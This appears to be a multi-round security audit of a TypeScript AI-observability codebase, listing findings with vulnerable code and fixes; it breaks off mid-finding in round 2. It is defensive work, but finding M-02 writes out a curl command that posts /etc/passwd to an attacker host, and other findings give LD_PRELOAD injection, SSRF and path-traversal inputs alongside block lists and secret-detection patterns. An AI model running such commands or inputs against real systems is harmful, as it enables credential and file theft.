# Security Audit — NR AI Observatory

**Date:** April 2026  
**Scope:** All TypeScript source files across the three packages: `@nr-ai-observatory/shared`, `nr-ai-agent`, `nr-ai-mcp-server`  
**Method:** Manual code review of every source file, focusing on input handling, secret management, network transport, filesystem access, and external process execution

---

## Summary

| ID | Severity | Package | Title |
|----|----------|---------|-------|
| [S-01](#s-01) | HIGH | shared | Path traversal in `loadCustomPricing` |
| [S-02](#s-02) | MEDIUM | shared | Custom pricing JSON cast without per-entry validation |
| [S-03](#s-03) | MEDIUM | shared | Account ID embedded in API URL without format validation |
| [S-04](#s-04) | MEDIUM | shared | `MetricAggregator` accepts non-finite metric values |
| [S-05](#s-05) | LOW | shared | `safeInt` accepts `Infinity` and negative values |
| [S-06](#s-06) | LOW | shared | `envInt` applies no range bounds after parsing |
| [S-07](#s-07) | LOW | shared | Logger `JSON.stringify` has no circular-reference guard |
| [A-01](#a-01) | HIGH | nr-ai-agent | Upstream error message forwarded verbatim — potential secret leakage |
| [A-02](#a-02) | MEDIUM | nr-ai-agent | No initialization lock in module-level `init()` singleton |
| [A-03](#a-03) | MEDIUM | nr-ai-agent | Tool names sent to New Relic without length or character validation |
| [A-04](#a-04) | LOW | nr-ai-agent | Stream event listeners never removed — GC prevention risk |
| [M-01](#m-01) | CRITICAL | nr-ai-mcp-server | SSRF: `HttpUpstream` URL not validated for private/internal addresses |
| [M-02](#m-02) | CRITICAL | nr-ai-mcp-server | Command injection: `StdioUpstream` executes user-controlled command and env |
| [M-03](#m-03) | HIGH | nr-ai-mcp-server | Buffer file created without restrictive permissions (world-readable) |
| [M-04](#m-04) | HIGH | nr-ai-mcp-server | `pending` map in `HookEventProcessor` has no size cap (memory DoS) |
| [M-05](#m-05) | HIGH | nr-ai-mcp-server | `readBody` in proxy has no timeout (slow-loris resource exhaustion) |
| [M-06](#m-06) | MEDIUM | nr-ai-mcp-server | Dangerous env vars (e.g. `LD_PRELOAD`) not filtered in `StdioUpstream` |
| [M-07](#m-07) | MEDIUM | nr-ai-mcp-server | Redaction patterns miss several common secret formats |
| [M-08](#m-08) | MEDIUM | nr-ai-mcp-server | Audit trail is in-memory only — lost on unclean shutdown |
| [M-09](#m-09) | LOW | nr-ai-mcp-server | Error responses include full request URL (information disclosure) |
| [M-10](#m-10) | LOW | nr-ai-mcp-server | SSE detection uses substring match instead of parsed media type |

**Round 1 totals:** 2 Critical · 3 High · 6 Medium · 5 Low *(all fixed)*

---

### Round 2 — April 2026

| ID | Severity | Package | Title |
|----|----------|---------|-------|
| [N-01](#n-01) | HIGH | nr-ai-mcp-server | Path traversal via unsanitized `sessionId` in storage filenames |
| [N-02](#n-02) | HIGH | nr-ai-mcp-server / shared | ReDoS risk in PEM redaction regex on unbounded input |
| [N-03](#n-03) | MEDIUM | nr-ai-mcp-server | Unvalidated `weekId` MCP tool argument reaches file-path construction |
| [N-04](#n-04) | MEDIUM | nr-ai-mcp-server | Unredacted command/filePath in `SecurityAlert` descriptions sent to NR |
| [N-05](#n-05) | MEDIUM | nr-ai-mcp-server | Unbounded token counts from `nr_observe_report_tokens` MCP tool |
| [N-06](#n-06) | MEDIUM | nr-ai-mcp-server | Session file keys spread into accumulator objects without `Object.create(null)` |
| [N-07](#n-07) | MEDIUM | nr-ai-mcp-server | Unsanitized git username flows into NR event fields and log output |
| [N-08](#n-08) | MEDIUM | nr-ai-mcp-server | Unbounded `notes` and `developer` strings from MCP tool inputs |
| [N-09](#n-09) | MEDIUM | nr-ai-mcp-server | Resource leak / race condition in SSE proxy error-handling path |
| [N-10](#n-10) | LOW | nr-ai-mcp-server | MCP server config has no `highSecurity` mode — inconsistent with shared package |
| [N-11](#n-11) | LOW | nr-ai-mcp-server | `filePath` and `command` not redacted before placement in NR audit event fields |
| [N-12](#n-12) | LOW | nr-ai-mcp-server | `install-helper` merges settings without validating existing hook entries |

**Round 2 totals:** 0 Critical · 2 High · 6 Medium · 4 Low

---

### Round 3 — April 2026 (Bug Hunt)

| ID | Severity | Package | Title |
|----|----------|---------|-------|
| [B-01](#b-01) | HIGH | shared / nr-ai-mcp-server | Retry buffer prepend drops newest events instead of oldest |
| [B-02](#b-02) | MEDIUM | nr-ai-mcp-server | `error_rate` platform comparison uses wrong formula |
| [B-03](#b-03) | MEDIUM | nr-ai-mcp-server | `totalTokens` inflated by double-counting cache tokens |
| [B-04](#b-04) | LOW | nr-ai-mcp-server | `detectReReading` uses `>` — exact threshold count not flagged |
| [B-05](#b-05) | LOW | nr-ai-mcp-server | Efficiency score `latest` may show stale completed-task score |
| [B-06](#b-06) | LOW | nr-ai-mcp-server | `overallSuccessRate` defaults to 1.0 for zero-call sessions |
| [B-07](#b-07) | LOW | nr-ai-mcp-server | Copilot adapter silently zeroes duration when start timestamp absent |

**Round 3 totals:** 0 Critical · 1 High · 2 Medium · 4 Low

---

## Package: `@nr-ai-observatory/shared`



---

### ✅ S-01

**Severity:** HIGH  
**File:** `packages/shared/src/pricing.ts:56–58`

**Vulnerable code:**
```typescript
export function loadCustomPricing(filePath: string): Record<string, ModelPricing> | null {
  try {
    const raw = readFileSync(filePath, 'utf-8');
```

**Description:** `loadCustomPricing` accepts an arbitrary filesystem path supplied by the caller (ultimately from `NEW_RELIC_AI_CUSTOM_PRICING_FILE` or a config file field) and calls `readFileSync` on it directly. No canonicalization or containment check is performed. An attacker who controls the config file or environment variable can supply a path like `../../../../etc/passwd` or any other file readable by the process, causing arbitrary file disclosure.

**Fix:** Resolve the path with `path.resolve()` and reject it if it falls outside an expected directory (e.g., the same directory as the config file or `~/.nr-ai-observe`). At minimum validate the extension is `.json` before reading.

---

### ✅ S-02

**Severity:** MEDIUM  
**File:** `packages/shared/src/pricing.ts:59–66`

**Vulnerable code:**
```typescript
const parsed = JSON.parse(raw) as Record<string, ModelPricing>;

if (typeof parsed !== 'object' || parsed === null || Array.isArray(parsed)) {
  logger.warn('Custom pricing file is not a JSON object', { filePath });
  return null;
}

return parsed;
```

**Description:** The top-level type is checked (must be a non-null, non-array object), but individual entries are cast to `ModelPricing` without validating that `inputPerMTok` and `outputPerMTok` are finite non-negative numbers. A custom pricing file that contains `{ "my-model": { "inputPerMTok": -999, "outputPerMTok": "EXPLOIT" } }` would be accepted and could silently produce negative or `NaN` cost values downstream.

**Fix:** After parsing, iterate each entry and assert that both rate fields are `typeof 'number'`, `Number.isFinite()`, and `>= 0`. Log a warning and skip invalid entries.

---

### ✅ S-03

**Severity:** MEDIUM  
**File:** `packages/shared/src/transport/http-client.ts:32`

**Vulnerable code:**
```typescript
return `https://${host}/v1/accounts/${accountId}/events`;
```

**Description:** `accountId` (sourced from `NEW_RELIC_ACCOUNT_ID` or the config file) is interpolated directly into the URL path without validation. While `host` is a hardcoded constant selected from a safe set, an `accountId` containing path-traversal characters (e.g. `"123/../other"`) or an excessively long value could produce a malformed URL. At a minimum, a non-numeric value should be rejected rather than silently forwarded.

**Fix:** Validate `accountId` is a string of 1–12 decimal digits (`/^\d{1,12}$/`) before it is first used in config loading, so the error surfaces at startup rather than at request time.

---

### ✅ S-04

**Severity:** MEDIUM  
**File:** `packages/shared/src/harvest/metric-aggregator.ts:43–46`

**Vulnerable code:**
```typescript
bucket.count++;
bucket.sum += value;
bucket.min = Math.min(bucket.min, value);
bucket.max = Math.max(bucket.max, value);
```

**Description:** No guard checks that `value` is a finite number before it enters the bucket. Passing `NaN` causes `bucket.sum` to become `NaN`, `bucket.min`/`max` to become `NaN`, and the harvested metric payload to contain invalid values that are silently accepted by the New Relic Metric API (or silently dropped). Passing `Infinity` has similar effects. Any code path that feeds a `getMetrics()` result directly into `aggregator.record()` without checking could introduce this.

**Fix:** Add a guard at the top of `record()`:
```typescript
if (!Number.isFinite(value)) {
  logger.warn('MetricAggregator.record: non-finite value ignored', { name, value });
  return;
}
```

---

### ✅ S-05

**Severity:** LOW  
**File:** `packages/shared/src/tokens.ts:10–13`

**Vulnerable code:**
```typescript
function safeInt(value: unknown): number {
  if (typeof value === 'number' && !Number.isNaN(value)) return value;
  return 0;
}
```

**Description:** `safeInt` filters out `NaN` and non-numbers, but passes through `Infinity` and negative values. A malformed SDK response with `input_tokens: Infinity` would be accepted and propagated into `totalTokens`, cost calculations, and the NR event payload. Negative token counts are semantically invalid and could cause cost estimates to go negative.

**Fix:**
```typescript
function safeInt(value: unknown): number {
  if (typeof value === 'number' && Number.isFinite(value) && value >= 0) {
    return Math.floor(value);
  }
  return 0;
}
```

---

### ✅ S-06

**Severity:** LOW  
**File:** `packages/shared/src/config.ts:54–59`

**Vulnerable code:**
```typescript
function envInt(key: string, defaultValue: number): number {
  const val = process.env[key];
  if (val === undefined) return defaultValue;
  const parsed = parseInt(val, 10);
  return Number.isNaN(parsed) ? defaultValue : parsed;
}
```

**Description:** `envInt` correctly rejects non-numeric values but applies no range bounds on the result. Settings like `NEW_RELIC_AI_EVENTS_HARVEST_MS=-1` or `NEW_RELIC_AI_CONTENT_MAX_LENGTH=0` are accepted and passed to downstream code that may not guard against zero or negative values (e.g. a harvest interval of `-1` ms would cause `setInterval` to fire as fast as possible).

**Fix:** Each caller should validate the returned value against a documented minimum and maximum. Alternatively, extend `envInt` to accept optional `{ min?, max? }` bounds and clamp or error.

---

### ✅ S-07

**Severity:** LOW  
**File:** `packages/shared/src/logger.ts:40`

**Vulnerable code:**
```typescript
process.stderr.write(JSON.stringify(entry) + '\n');
```

**Description:** `JSON.stringify` throws a `TypeError` when given an object with circular references. If any caller passes a `data` object that contains a circular structure (e.g. an error with a `.cause` chain that loops back, or an SDK response object), the logger itself throws, which is unexpected for a logging function. Because the throw propagates to the caller, it can disrupt normal request handling.

**Fix:** Wrap the serialize step in a try/catch with a safe fallback:
```typescript
let serialized: string;
try {
  serialized = JSON.stringify(entry);
} catch {
  serialized = JSON.stringify({ ...entry, data: '[unserializable]' });
}
process.stderr.write(serialized + '\n');
```

---

## Package: `nr-ai-agent`

---

### ✅ A-01

**Severity:** HIGH  
**File:** `packages/nr-ai-agent/src/wrappers/anthropic.ts:186, 202–203`

**Vulnerable code:**
```typescript
const error = err as { status?: number; error?: { type?: string }; message?: string };
// ...
type: error.error?.type ?? (err instanceof Error ? err.constructor.name : 'Unknown'),
message: truncate(error.message ?? (err instanceof Error ? err.message : String(err)), 1024),
```

**Description:** When an API call fails, the error object is cast to a typed interface without runtime validation and its `.message` is forwarded—after truncation—to New Relic as a recorded field. Upstream error messages from the Anthropic SDK occasionally embed context from the failed request, which may include prompt fragments, API keys passed in headers, or PII. The `truncate()` call limits length but performs no content-based redaction. The same pattern appears in `wrappers/gemini.ts`.

Because the field is already sent to an observability backend (New Relic), any secret that appears in an error message is effectively exfiltrated to a third party log store.

**Fix:** Pass the error message through the same redaction pipeline used for content fields before forwarding it. At minimum, apply `DEFAULT_REDACTION_PATTERNS` from `config.ts` to strip known secret formats:
```typescript
message: truncate(redact(rawMessage, config.redactionPatterns), 1024),
```

---

### ✅ A-02

**Severity:** MEDIUM  
**File:** `packages/nr-ai-agent/src/agent.ts:36–46`

**Vulnerable code:**
```typescript
let instance: NrAiAgent | null = null;

export function init(options?: Partial<AgentConfig>): NrAiAgent {
  if (instance) {
    logger.warn('init() called multiple times — returning existing instance');
    return instance;
  }
  const config = loadConfig(options);
  instance = new NrAiAgent(config);
  return instance;
}
```

**Description:** The singleton guard is a non-atomic check-then-set. JavaScript is single-threaded for synchronous code, but in environments where `init()` is invoked from multiple concurrent async task graphs before the first one completes (e.g., Lambda cold-start with concurrent invocations sharing a module cache), two callers can both observe `instance === null` and both proceed past the guard. The result is two `NrAiAgent` instances with two separate `HarvestScheduler` instances, causing doubled metric emission, potential duplicate events in New Relic, and the first scheduler's reference being lost (leaked timer).

**Fix:** Introduce an initialization promise:
```typescript
let initPromise: Promise<NrAiAgent> | null = null;

export async function init(options?: Partial<AgentConfig>): Promise<NrAiAgent> {
  if (!initPromise) {
    initPromise = Promise.resolve().then(() => {
      const config = loadConfig(options);
      return new NrAiAgent(config);
    });
  }
  return initPromise;
}
```

---

### ✅ A-03

**Severity:** MEDIUM  
**File:** `packages/nr-ai-agent/src/wrappers/anthropic.ts:70`

**Vulnerable code:**
```typescript
const names = tools.map((t) => t.name);
```

**Description:** Tool names come directly from the caller's `tools` array and are stored in the `toolNames` field of every NR event without any length or character validation. A caller could pass tool names containing newlines, NUL bytes, or strings many kilobytes long. These values end up in the NR event payload and, if reflected in dashboards or alert conditions that interpolate them into NRQL or HTML, could cause issues in downstream consumers. The same pattern occurs in `wrappers/gemini.ts`.

**Fix:** Sanitize and truncate each tool name before storing:
```typescript
const names = tools.map((t) => String(t.name ?? '').slice(0, 256).replace(/[\x00-\x1f]/g, ''));
```

---

### ✅ A-04

**Severity:** LOW  
**File:** `packages/nr-ai-agent/src/wrappers/anthropic.ts:363, 367, 373`

**Vulnerable code:**
```typescript
messageStream.on('text', () => { timer.markFirstToken(); });
messageStream.on('finalMessage', (message: Message) => { ... onRecord(record); });
messageStream.on('error', (err: Error) => { ... onRecord(record); });
```

**Description:** Event listeners are attached to `messageStream` but never removed. In Node.js, an `EventEmitter` retains a strong reference to every registered listener function, and each listener closure captures `base`, `timer`, `config`, and `onRecord`. In a high-throughput service that creates many concurrent streams, completed streams whose references are otherwise dropped will not be garbage collected until their listeners are freed. Over time this produces a slow memory leak.

**Fix:** Replace `on` with `once` for `finalMessage` and `error`, and call `messageStream.removeAllListeners()` inside the `finalMessage` handler after the record has been emitted.

---

## Package: `nr-ai-mcp-server`

---

### ✅ M-01

**Severity:** CRITICAL  
**File:** `packages/nr-ai-mcp-server/src/proxy/upstream-http.ts:58–64`

**Vulnerable code:**
```typescript
constructor(config: UpstreamConfig) {
  if (!config.url) {
    throw new Error(`HttpUpstream "${config.name}" requires a url`);
  }
  this.name = config.name;
  this.url = new URL(config.url);   // no host or scheme validation
  this.timeoutMs = config.timeoutMs ?? 30_000;
}
```

**Description:** The URL supplied in the proxy config (from a user-editable config file or environment variable) is parsed but never validated for scheme or hostname. The downstream `forward()` method then issues an HTTP/HTTPS request to whatever host was parsed. This is a Server-Side Request Forgery (SSRF) vulnerability.

An attacker who can write the server's config file (or set `NEW_RELIC_AI_MCP_PROXY_UPSTREAMS` in the environment) can direct the proxy to:
- `http://169.254.169.254/latest/meta-data/` (AWS instance metadata — leaks IAM credentials)
- `http://10.0.0.1/` (internal network services)
- `file:///etc/passwd` (if the Node.js http module follows non-http schemes)
- Any internal service that trusts localhost or the machine's IP

**Fix:** After parsing the URL, enforce allowed schemes and reject RFC-1918 and link-local addresses:
```typescript
const ALLOWED_SCHEMES = new Set(['http:', 'https:']);
const BLOCKED_HOST_RE = /^(127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|::1|localhost)/i;

if (!ALLOWED_SCHEMES.has(this.url.protocol)) {
  throw new Error(`HttpUpstream "${config.name}": scheme "${this.url.protocol}" not allowed`);
}
if (BLOCKED_HOST_RE.test(this.url.hostname)) {
  throw new Error(`HttpUpstream "${config.name}": private/loopback addresses not allowed`);
}
```

---

### ✅ M-02

**Severity:** CRITICAL  
**File:** `packages/nr-ai-mcp-server/src/proxy/upstream-stdio.ts:103–108`

**Vulnerable code:**
```typescript
this.transport = new StdioClientTransport({
  command: this.config.command!,
  args: this.config.args,
  env: this.config.env,
  stderr: 'pipe',
});
```

**Description:** The `command`, `args`, and `env` fields come directly from `UpstreamConfig`, which is parsed from the config file or `NEW_RELIC_AI_MCP_PROXY_UPSTREAMS` environment variable. They are passed without any validation to the MCP SDK's `StdioClientTransport`, which spawns a child process.

**Command/args vector:** Any binary on `PATH` can be executed with arbitrary arguments. Example: `{ "command": "curl", "args": ["-X", "POST", "https://attacker.com", "--data", "@/etc/passwd"] }` exfiltrates `/etc/passwd`.

**Env vector:** The `env` field is merged into the child process environment. Setting `LD_PRELOAD=/tmp/malicious.so` causes the child to load an attacker-controlled shared library before executing. Setting `PATH=/tmp/evil:...` redirects any exec calls inside the child to attacker-supplied binaries.

**Fix:**
1. Validate `command` is an absolute path or a known-safe binary name (whitelist or path resolution with `which`).
2. Strip environment keys that are known dangerous before passing to the child: `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_INSERT_LIBRARIES`, `DYLD_LIBRARY_PATH`, `PATH` (replace with a hardened minimal value).
3. Log the resolved command path at startup rather than at request time, so anomalies are visible.

---

### ✅ M-03

**Severity:** HIGH  
**File:** `packages/nr-ai-mcp-server/src/hooks/collector-script.ts:269–291`

**Vulnerable code:**
```typescript
if (!existsSync(bufferDir)) {
  mkdirSync(bufferDir, { recursive: true });
}
// ...
const fd = openSync(bufferPath, fsConstants.O_WRONLY | fsConstants.O_CREAT | fsConstants.O_APPEND);
```

**Description:** Both `mkdirSync` and `openSync` are called without an explicit `mode` parameter. On POSIX systems this inherits the process `umask`, which defaults to `0o022`, producing directory permissions of `0o755` (world-executable, world-readable) and file permissions of `0o644` (world-readable).

The buffer file at `~/.nr-ai-observe/buffer.jsonl` accumulates all tool call metadata: file paths read and written, command lines executed, session IDs, and portions of file content when `recordContent` is enabled. Any other user on the same machine can read this file.

**Fix:** Pass explicit modes:
```typescript
mkdirSync(bufferDir, { recursive: true, mode: 0o700 });
// ...
const fd = openSync(bufferPath, fsConstants.O_WRONLY | fsConstants.O_CREAT | fsConstants.O_APPEND, 0o600);
```
Apply the same fix to `LocalStore.initialize()` in `storage/local-store.ts` for the `sessions/` and `audit/` subdirectories.

---

### ✅ M-04

**Severity:** HIGH  
**File:** `packages/nr-ai-mcp-server/src/hooks/event-processor.ts:37`

**Vulnerable code:**
```typescript
private readonly pending: Map<string, HookEvent> = new Map();
// ...
private handlePreEvent(event: HookEvent): void {
  const key = this.pairingKey(event);
  this.pending.set(key, event);  // no size limit
}
```

**Description:** Pre-tool events are stored in `pending` until a matching post-tool event arrives or the orphan timeout (60 s) expires. There is no upper bound on the map's size. If a large number of pre-events accumulate without corresponding post-events — either due to a bug in Claude Code's hook delivery or a deliberate flood of hook writes to the buffer file — the map grows without bound, consuming heap memory until the process is killed by the OS OOM killer.

Because hook events are written by an unprivileged script (`nr-ai-observe`) that any process running as the same user can invoke, this is a local DoS vector.

**Fix:** Add a size cap with early eviction:
```typescript
private readonly MAX_PENDING = 2_000;

private handlePreEvent(event: HookEvent): void {
  if (this.pending.size >= this.MAX_PENDING) {
    // Drop the oldest entry to make room
    const oldestKey = this.pending.keys().next().value;
    this.pending.delete(oldestKey);
    logger.warn('Pending map overflow — oldest pre-event dropped');
  }
  this.pending.set(this.pairingKey(event), event);
}
```

---

### ✅ M-05

**Severity:** HIGH  
**File:** `packages/nr-ai-mcp-server/src/proxy/proxy-manager.ts:311–328`

**Vulnerable code:**
```typescript
function readBody(req: IncomingMessage): Promise<Buffer> {
  return new Promise((resolve, reject) => {
    if (req.method === 'GET') { resolve(Buffer.alloc(0)); return; }
    const chunks: Buffer[] = [];
    // ...
    req.on('data', (chunk: Buffer) => chunks.push(chunk));
    req.on('end', () => settle(() => resolve(Buffer.concat(chunks))));
    req.on('error', (err) => settle(() => reject(err)));
    req.on('close', () => settle(() => reject(new Error('Request closed ...'))));
    // no timeout
  });
}
```

**Description:** A client that opens a TCP connection to the proxy, sends a valid HTTP request line and headers, but then stalls the body indefinitely will hold the promise open forever. The Node.js HTTP server has no default request body timeout. Each stalled connection consumes a socket descriptor and the growing `chunks` array. With enough concurrent stalled connections the proxy's file descriptor limit is exhausted and it stops accepting new requests — a slow-loris resource exhaustion attack.

**Fix:** Add a timeout to the promise:
```typescript
const timeoutHandle = setTimeout(
  () => settle(() => reject(new Error('Body read timeout'))),
  30_000,
);
req.on('end', () => { clearTimeout(timeoutHandle); settle(() => resolve(Buffer.concat(chunks))); });
req.on('error', (err) => { clearTimeout(timeoutHandle); settle(() => reject(err)); });
```
Additionally, enforce a maximum body size by rejecting the promise when `chunks` total exceeds a configured limit (e.g. 10 MB).

---

### ✅ M-06

**Severity:** MEDIUM  
**File:** `packages/nr-ai-mcp-server/src/proxy/upstream-stdio.ts:106`

**Vulnerable code:**
```typescript
this.transport = new StdioClientTransport({
  command: this.config.command!,
  args: this.config.args,
  env: this.config.env,   // user-supplied env passed directly
  stderr: 'pipe',
});
```

**Description:** Even if the `command` itself is safe (see M-02), the user-supplied `env` object is passed directly to the child process environment. Dynamic linker variables — `LD_PRELOAD`, `LD_LIBRARY_PATH` on Linux and `DYLD_INSERT_LIBRARIES`, `DYLD_LIBRARY_PATH` on macOS — instruct the OS loader to inject shared libraries before the main executable runs. Any user who can influence the config file can abuse this to inject code into the child MCP process.

This is distinct from M-02 in that the command itself could be a legitimate, known-safe binary (e.g. `node`) while the env still allows code injection.

**Fix:** Sanitize the env before passing it to `StdioClientTransport`. Strip or error on a blocklist of known dangerous keys:
```typescript
const DANGEROUS_ENV_KEYS = new Set([
  'LD_PRELOAD', 'LD_LIBRARY_PATH',
  'DYLD_INSERT_LIBRARIES', 'DYLD_LIBRARY_PATH',
  'NODE_OPTIONS',
]);

const safeEnv = Object.fromEntries(
  Object.entries(this.config.env ?? {}).filter(([k]) => !DANGEROUS_ENV_KEYS.has(k)),
);
```

---

### ✅ M-07

**Severity:** MEDIUM  
**File:** `packages/nr-ai-mcp-server/src/config.ts:31–35`

**Vulnerable code:**
```typescript
const DEFAULT_REDACTION_PATTERNS: RegExp[] = [
  /\b(?:API_KEY|SECRET|TOKEN|PASSWORD|PASSPHRASE|PRIVATE_KEY)\b[\s]*[=:]\s*\S+/gi,
  /(?:sk-|ghp_|gho_|github_pat_|xoxb-|xoxp-|Bearer\s+)\S+/g,
  /-----BEGIN[\s\S]*?-----END[^\n]*-----/g,
];
```

**Description:** The redaction patterns cover a useful subset of secrets but miss several widely-used formats:

| Secret type | Example | Missed? |
|---|---|---|
| AWS access key | `AKIAIOSFODNN7EXAMPLE` | Yes |
| AWS secret key | `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` | Yes |
| Google API key | `AIzaSy...` | Yes |
| JWT token | `eyJhbGciOi...` | Yes — only `Bearer ` prefix is caught |
| Slack legacy tokens | `xoxa-`, `xoxr-` | Partially — `xoxb-`/`xoxp-` caught, others missed |
| npm auth tokens | `npm_...` | Yes |

Any of these that appear in tool output, bash command output, or file content will be forwarded unredacted to New Relic logs.

**Fix:** Add the missing patterns:
```typescript
/\bAKIA[0-9A-Z]{16}\b/g,                           // AWS access key ID
/\bAIzaSy[0-9A-Za-z_-]{33}\b/g,                     // Google API key
/\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b/g,  // JWT
/\bnpm_[A-Za-z0-9]{36}\b/g,                          // npm token
/\bxox[a-z]-[0-9A-Za-z-]+/g,                         // all Slack token types
```

---

### ✅ M-08

**Severity:** MEDIUM  
**File:** `packages/nr-ai-mcp-server/src/security/audit-trail.ts:246–247`

**Vulnerable code:**
```typescript
private entries: AuditRecord[] = [];
private sensitiveAccessLog: AuditRecord[] = [];
```

**Description:** Both the general audit trail and the sensitive-access log are held exclusively in memory as plain arrays. The `AuditTrailManager` has no method to persist them to disk during normal operation, only a `getAuditLog()` / `getSensitiveAccessLog()` query interface. If the MCP server process is killed with `SIGKILL`, crashes with an uncaught exception, or is OOM-killed, the entire audit history for the current session is silently lost.

This defeats the purpose of an audit trail when it matters most — in precisely the scenarios (crashes, unexpected termination) where audit data is most needed.

**Fix:** Either (a) persist each record immediately by calling `localStore.appendAuditLog()` inside `recordToolCall()`, or (b) flush the in-memory log to disk on a short interval (e.g. every 5 s) and on `stop()`. The `LocalStore.appendAuditLog` method already exists for this purpose.

---

### ✅ M-09

**Severity:** LOW  
**File:** `packages/nr-ai-mcp-server/src/proxy/proxy-manager.ts:187, 202`

**Vulnerable code:**
```typescript
res.end(JSON.stringify({ error: 'not_found', message: `No route for ${url}` }));
// ...
res.end(JSON.stringify({ error: 'upstream_not_found', message: `Unknown upstream: ${serverName}` }));
```

**Description:** Error responses to HTTP clients echo back the full requested URL path and the decoded upstream server name. If the proxy is ever exposed beyond localhost (e.g. on a shared dev host or through a misconfigured firewall), these responses disclose the internal structure of configured upstream names and route paths to unauthenticated requesters.

**Fix:** Log the detailed information server-side and return a generic message to the client:
```typescript
logger.warn('Proxy route not found', { url });
res.end(JSON.stringify({ error: 'not_found' }));
```

---

### ✅ M-10

**Severity:** LOW  
**File:** `packages/nr-ai-mcp-server/src/proxy/upstream-http.ts:109–110`

**Vulnerable code:**
```typescript
const contentType = upstreamRes.headers['content-type'] ?? '';
const isStreaming = contentType.includes('text/event-stream');
```

**Description:** The `Content-Type` check for SSE uses `String.includes`, which matches the substring anywhere in the header value. A header like `Content-Type: text/event-stream; charset=utf-8` is correctly identified, but so is a crafted value like `Content-Type: application/json; description="not-text/event-stream"`. While a rogue upstream would need to deliberately craft such a header, parsing the media type properly is straightforward and eliminates the ambiguity.

**Fix:**
```typescript
const mediaType = (upstreamRes.headers['content-type'] ?? '').split(';')[0].trim().toLowerCase();
const isStreaming = mediaType === 'text/event-stream';
```

---

## Positive Observations

These patterns are done well and should be preserved in future code.

**Active secret redaction before logging.** Both `collector-script.ts` and `config.ts` apply `DEFAULT_REDACTION_PATTERNS` to tool output and config values before they reach the logger or the NR ingest pipeline. This is the right place and approach — redact early, close to the source.

**Credentials never logged.** Debug-level config logging in `config.ts` explicitly omits `licenseKey` and `accountId`. No credential fields appear in any logger call across the codebase.

**HTTPS enforced for all NR API endpoints.** `http-client.ts` constructs all event, metric, and log API URLs with hardcoded `https://` prefixes and hardcoded hostnames; no user input can alter the transport scheme or destination host for New Relic ingestion.

**Atomic buffer drain.** `LocalStore.drainBuffer()` uses a POSIX-atomic `rename()` before reading, preventing data loss when the collector script and the processor poll concurrently. The `.drain` recovery path handles the one failure mode (crash between rename and delete) without discarding events.

**Destructive command detection.** `AuditTrailManager` maintains pattern lists for destructive Bash commands (`rm -rf`, `DROP TABLE`, pipe-to-shell) and sensitive file access (`.env`, `.pem`, private keys) and emits NR events for both. The detection runs on every tool call regardless of success.

**Payload compression.** All HTTP transport to New Relic uses gzip compression via `compressPayload()`, reducing the window of time that cleartext data is in flight.

**`node:crypto` for UUIDs.** `randomUUID()` from the Node.js crypto module is used throughout for session and request IDs. This avoids Math.random()-based approaches that are predictable.

**Graceful shutdown with cleanup.** `index.ts` wraps all shutdown steps in try/catch/finally (fixed in round 6) so `process.exit(0)` is called even if individual `stop()` calls throw, preventing zombie processes and leaked timers.

**Config immutability.** `EMPTY_USAGE` in `tokens.ts` and top-level config objects use `Object.freeze()`, preventing accidental mutation after initialization.

---

## Recommended Actions

Ordered by risk — address Critical items before shipping to any shared environment.

1. **[M-01 — CRITICAL]** Add SSRF protection to `HttpUpstream`: validate scheme is `http:` or `https:` and reject RFC-1918, loopback, and link-local host addresses.

2. **[M-02 — CRITICAL]** Add command validation and env sanitization to `StdioUpstream`: either whitelist allowed executables or reject dynamic-linker injection keys (`LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`, etc.) from the supplied env.

3. **[S-01 — HIGH]** Sandbox the `loadCustomPricing` file path to a known-safe directory using `path.resolve()` + containment check.

4. **[M-03 — HIGH]** Set explicit `0o700`/`0o600` permissions when creating the storage directory and buffer file so that other users on the same machine cannot read tool call history.

5. **[M-04 — HIGH]** Cap the `pending` map in `HookEventProcessor` at a fixed size (e.g. 2 000 entries) to prevent memory exhaustion from unpaired pre-events.

6. **[M-05 — HIGH]** Add a read timeout and maximum body size to `readBody()` in the proxy to prevent slow-loris exhaustion.

7. **[A-01 — HIGH]** Apply the redaction pipeline to upstream API error messages before they are stored in NR event fields.

8. **[M-07 — MEDIUM]** Extend redaction patterns to cover AWS access keys, Google API keys, JWTs, npm tokens, and additional Slack token formats.

9. **[M-08 — MEDIUM]** Persist audit trail records to disk (via `localStore.appendAuditLog`) in real time rather than holding them only in memory.

10. **[S-04 — MEDIUM]** Add a `Number.isFinite` guard to `MetricAggregator.record()` to reject `NaN` and `Infinity` values before they corrupt metric buckets.

11. **[S-02 — MEDIUM]** Validate per-entry fields in custom pricing JSON after parsing; reject entries with non-finite or negative rate values.

12. **[M-06 — MEDIUM]** Strip dangerous dynamic-linker env vars from `StdioUpstream.env` even when the command itself is trusted.

13. **[A-02 — MEDIUM]** Introduce an initialization lock (promise-based) to `init()` in `nr-ai-agent` to prevent duplicate scheduler creation under concurrent calls.

14. **[S-05 — LOW / S-06 — LOW]** Tighten `safeInt` to reject `Infinity` and negatives; add range validation to `envInt` callers for harvest intervals and content length limits.

15. **[S-07 — LOW]** Guard `JSON.stringify` in the logger with a circular-reference fallback so a bad `data` argument cannot crash the logger itself.

---

---

## Round 2 Findings — April 2026

Second-pass review of all source files after round-1 fixes were applied. Scope unchanged.

---

### ✅ N-01

**Severity:** HIGH  
**File:** `packages/nr-ai-mcp-server/src/storage/local-store.ts:117`, `packages/nr-ai-mcp-server/src/storage/session-store.ts:97`

**Vulnerable code:**
```typescript
// local-store.ts
const filename = `${session.sessionId}.json`;
const filepath = resolve(this.storagePath, 'sessions', filename);
writeFileSync(filepath, JSON.stringify(session, null, 2) + '\n');

// session-store.ts
const filename = `${date}_${summary.sessionId}.json`;
const filepath = join(this.sessionsDir, filename);
```

**Description:** The `sessionId` value originates from Claude Code's hook payload (`data.session_id` in the hook event) — an external string supplied by the MCP client — and is used directly in a filename without any format validation or path-containment check. `resolve()` normalises `.` and `..` segments, so a `sessionId` of `../../.bashrc` would escape the sessions directory. A malicious or malfunctioning MCP client that sends a crafted `session_id` could write or overwrite arbitrary files owned by the server process.

**Fix:** Validate `sessionId` against a strict allowlist pattern before using it in a path, and assert the resolved path stays within the expected directory:
```typescript
if (!/^[A-Za-z0-9_\-]{1,128}$/.test(sessionId)) {
